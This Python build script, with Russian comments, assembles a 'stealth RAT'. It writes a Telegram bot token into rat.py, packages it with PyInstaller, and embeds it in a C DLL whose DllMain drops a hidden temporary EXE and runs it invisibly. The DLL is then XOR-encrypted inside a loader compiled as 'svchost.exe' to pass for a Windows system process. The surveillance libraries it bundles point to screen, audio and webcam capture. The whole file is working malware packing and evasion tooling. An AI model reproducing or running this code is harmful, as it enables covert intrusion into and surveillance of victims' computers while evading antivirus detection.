# build.py - Сборка EXE с зашифрованной DLL (ПРОСТАЯ ВЕРСИЯ)
import os
import sys
import subprocess
import random
import zlib
import shutil

class StealthBuilder:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        self.xor_key = bytes([random.randint(1, 255) for _ in range(16)])
        
    def build_exe_with_pyinstaller(self):
        print("[+] Building EXE with PyInstaller...")
        
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name", "payload",
            "--target-arch", "x86",
            "--upx-dir", "C:\\ProgramData\\chocolatey\\lib\\upx\\tools",
            "--hidden-import", "telegram",
            "--hidden-import", "telegram.ext",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.ImageGrab",
            "--hidden-import", "psutil",
            "--hidden-import", "requests",
            "--hidden-import", "sounddevice",
            "--hidden-import", "soundfile",
            "--hidden-import", "cryptography",
            "--hidden-import", "cryptography.fernet",
            "--hidden-import", "tkinter",
            "--hidden-import", "pycaw",
            "--hidden-import", "comtypes",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "GPUtil",
            "--hidden-import", "win10toast",
            "--collect-all", "telegram",
            "rat.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] PyInstaller error: {result.stderr.decode()}")
            return None
            
        exe_path = "dist/payload.exe"
        if not os.path.exists(exe_path):
            for f in os.listdir("dist"):
                if f.endswith(".exe"):
                    exe_path = os.path.join("dist", f)
                    break
        
        if not os.path.exists(exe_path):
            print("[-] EXE not found!")
            return None
            
        shutil.copy(exe_path, "payload.exe")
        size_mb = os.path.getsize('payload.exe') / (1024*1024)
        print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
        return "payload.exe"
    
    def convert_exe_to_dll(self, exe_path):
        print("[+] Converting EXE to DLL...")
        
        with open(exe_path, 'rb') as f:
            exe_data = f.read()
        
        # ПРОСТОЙ C код БЕЗ комментариев и спецсимволов
        dll_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

static unsigned char exe_data[] = {
DATA
};
static unsigned int exe_size = SIZE;

static void RunEXE() {
    char temp_path[MAX_PATH];
    char exe_path[MAX_PATH];
    DWORD written;
    HANDLE hFile;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    GetTempPathA(MAX_PATH, temp_path);
    sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
    
    hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    WriteFile(hFile, exe_data, exe_size, &written, NULL);
    CloseHandle(hFile);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    Sleep(5000);
    DeleteFileA(exe_path);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunEXE, NULL, 0, NULL);
    }
    return TRUE;
}
'''
        # Конвертируем EXE в HEX строку
        hex_parts = []
        for i, b in enumerate(exe_data):
            if i > 0 and i % 16 == 0:
                hex_parts.append('\n    ')
            hex_parts.append(f'0x{b:02X}, ')
        
        hex_string = ''.join(hex_parts).rstrip(', ')
        
        # Заменяем плейсхолдеры
        final_code = dll_code.replace('DATA', hex_string)
        final_code = final_code.replace('SIZE', str(len(exe_data)))
        
        # Сохраняем в ASCII (без UTF-8)
        with open('payload_dll.c', 'w', encoding='ascii', errors='ignore') as f:
            f.write(final_code)
        
        cmd = [
            'gcc', '-shared', '-o', 'payload.dll',
            'payload_dll.c',
            '-static', '-s', '-O2',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] DLL compilation error: {result.stderr.decode()}")
            return None
            
        size_mb = os.path.getsize('payload.dll') / (1024*1024)
        print(f"[+] DLL ready! Size: {size_mb:.1f} MB")
        return "payload.dll"
    
    def encrypt_dll(self, dll_path):
        print("[+] Encrypting DLL...")
        
        with open(dll_path, 'rb') as f:
            dll_data = f.read()
        
        compressed = zlib.compress(dll_data, level=9)
        
        encrypted = bytearray(compressed)
        for i in range(len(encrypted)):
            encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
        
        size_mb = len(encrypted) / (1024*1024)
        print(f"[+] Encrypted! Size: {size_mb:.1f} MB")
        return encrypted
    
    def bytes_to_c_array(self, data, name):
        result = f'unsigned char {name}[] = {{\n    '
        for i, b in enumerate(data):
            if i > 0:
                result += ', '
            result += f'0x{b:02X}'
            if (i + 1) % 16 == 0:
                result += ',\n    '
        result += '\n};\n'
        return result
    
    def build_loader(self, encrypted_dll):
        print("[+] Building loader...")
        
        with open('loader.cpp', 'rb') as f:
            loader = f.read().decode('ascii', errors='ignore')
        
        encrypted_array = self.bytes_to_c_array(encrypted_dll, 'encrypted_dll')
        key_array = self.bytes_to_c_array(self.xor_key, 'xor_key')
        
        loader = loader.replace(
            'extern unsigned char encrypted_dll[];',
            encrypted_array
        )
        loader = loader.replace(
            'extern unsigned int dll_len;',
            f'unsigned int dll_len = {len(encrypted_dll)};'
        )
        loader = loader.replace(
            'extern unsigned char xor_key[];',
            key_array
        )
        loader = loader.replace(
            'extern unsigned int key_len;',
            f'unsigned int key_len = {len(self.xor_key)};'
        )
        
        with open('loader_final.cpp', 'w', encoding='ascii', errors='ignore') as f:
            f.write(loader)
        
        print("[+] Loader ready!")
        return 'loader_final.cpp'
    
    def compile_loader(self, loader_path):
        print("[+] Compiling final EXE...")
        
        cmd = [
            'g++',
            '-o', 'svchost.exe',
            loader_path,
            '-static',
            '-s',
            '-O1',
            '-Wl,--subsystem,windows',
            '-luser32', '-lkernel32'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"[-] Error: {result.stderr.decode()}")
            return None
        
        size_kb = os.path.getsize('svchost.exe') / 1024
        print(f"[+] FINAL EXE ready! Size: {size_kb:.1f} KB")
        return 'svchost.exe'
    
    def build(self):
        print("[+] STARTING STEALTH RAT BUILD")
        print("=" * 60)
        
        print("[+] Updating rat.py...")
        with open('rat.py', 'r', encoding='utf-8') as f:
            content = f.read()
        content = content.replace('{{TOKEN}}', self.token)
        content = content.replace('{{ADMIN_ID}}', str(self.admin_id))
        with open('rat.py', 'w', encoding='utf-8') as f:
            f.write(content)
        
        exe = self.build_exe_with_pyinstaller()
        if not exe:
            return False
        
        dll = self.convert_exe_to_dll(exe)
        if not dll:
            return False
        
        encrypted = self.encrypt_dll(dll)
        if not encrypted:
            return False
        
        loader = self.build_loader(encrypted)
        if not loader:
            return False
        
        final_exe = self.compile_loader(loader)
        
        if final_exe:
            print("=" * 60)
            print("[+] BUILD COMPLETED SUCCESSFULLY!")
            print(f"[+] FINAL EXE: {final_exe} ({os.path.getsize(final_exe) / 1024:.1f} KB)")
            print(f"[+] Original EXE: {exe} ({os.path.getsize(exe) / (1024*1024):.1f} MB)")
            print(f"[+] Key: {self.xor_key.hex()}")
            
            with open('key.txt', 'w') as f:
                f.write(self.xor_key.hex())
            
            return True
        
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python build.py TOKEN ADMIN_ID")
        sys.exit(1)
    
    token = sys.argv[1]
    admin_id = sys.argv[2]
    
    builder = StealthBuilder(token, admin_id)
    builder.build()
